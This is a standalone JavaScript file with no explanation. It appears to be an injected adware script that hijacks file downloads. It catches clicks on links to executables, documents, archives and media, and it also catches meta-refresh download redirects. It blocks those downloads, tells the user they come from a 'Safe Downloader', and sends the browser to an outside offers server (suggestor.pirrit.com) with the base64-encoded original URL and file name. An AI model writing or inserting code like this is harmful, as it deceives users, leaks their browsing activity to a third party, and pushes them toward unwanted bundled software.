
    (function() {
    var extensions = ['exe','bat','msi','mp3','mp4','wac','wma','mid','doc','docx','odt','csv','pps','ppt','pptx','tar','avi','flv','mov','mpg','rm','swf','wmv','pdf','xls','xlsx','zip','7z','zipx','tar.gz','rar','bin','cue','iso','vcd'];
    var offerServiceUrl = 'http://suggestor.pirrit.com/engine/offers.php';
                 
	String.prototype.escapeHTML = function() {
		return this.split('&').join('&amp;').split('"').join('&quot;').split('<').join('&lt;');
	}
	
	function qualifyURL(url) {
		var element = document.createElement('span');
		element.innerHTML = '<a href="'+url.escapeHTML()+'">&nbsp;</a>';
		return element.firstChild.href;
	}        
	               
    function getUrlExtension(url) {
        var queryUrl = url.toLowerCase().split('?');
        var regex = new RegExp(/\.(.*)$/);

        if (queryUrl.length === 2) {
            url = queryUrl[0];
        }
        var queryUrl = url.split('/');
        url = queryUrl[queryUrl.length - 1];
        var ext = regex.exec(url);
        
        return (ext === null ? null : ext[1]);
    }

        
    function safeDownloader(url) {
        var r = confirm('Download using Safe Downloader?');
		var fileName = url;
		
		var queryUrl = url.toLowerCase().split('?');

        if (queryUrl.length === 2) {
            fileName = queryUrl[0];
        }
        queryUrl = fileName.split('/');
        fileName = queryUrl[queryUrl.length - 1];
		
        if (r === true) {
            var redirectUrl = offerServiceUrl + '?r=1&d=' + base64encode(url) + '&n=' + base64encode(fileName);
        } else {
            var redirectUrl = offerServiceUrl + '?r=0&d=' + base64encode(url) + '&n=' + base64encode(fileName);
        }
        window.location = redirectUrl;
    }
    
    function base64encode(input) {
        var keyStr = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
        input = escape(input);
        var output = '';
        var chr1, chr2, chr3 = '';
        var enc1, enc2, enc3, enc4 = '';
        var i = 0;

        do {
            chr1 = input.charCodeAt(i++);
            chr2 = input.charCodeAt(i++);
            chr3 = input.charCodeAt(i++);

            enc1 = chr1 >> 2;
            enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
            enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
            enc4 = chr3 & 63;

            if (isNaN(chr2)) {
                enc3 = enc4 = 64;
            } else if (isNaN(chr3)) {
                enc4 = 64;
            }

            output = output +
                    keyStr.charAt(enc1) +
                    keyStr.charAt(enc2) +
                    keyStr.charAt(enc3) +
                    keyStr.charAt(enc4);
            chr1 = chr2 = chr3 = '';
            enc1 = enc2 = enc3 = enc4 = '';
        } while (i < input.length);

        return output;
    }

    document.body.addEventListener('click', function(e) {
        if (e.target.tagName === 'A') {
            var url = qualifyURL(e.target.getAttribute('href'));
            var ext = getUrlExtension(url);
            
            if (ext && extensions.indexOf(ext) != -1) {
                e.preventDefault();
                safeDownloader(url)
            }
        }
     }, false);

    var meta = document.getElementsByTagName('meta');
    var redirect;

    for (var i = 0; meta.length > i; i++) {
        redirect = meta[i].httpEquiv.toLowerCase().trim();
         if (redirect === 'refresh') {
            var content = meta[i].content.split(/;\s*[uU][rR][lL]=/);
            if (content.length === 2) {
                var url = qualifyURL(content[1].toLowerCase().trim());
                var timeout = parseInt(content[0].trim()) * 1000;
                var ext = getUrlExtension(url);
                if (ext && extensions.indexOf(ext) != -1) {
                    setTimeout(function() {
                        safeDownloader(url);        
                    }, timeout);
                }
            }
        }
    }

})();
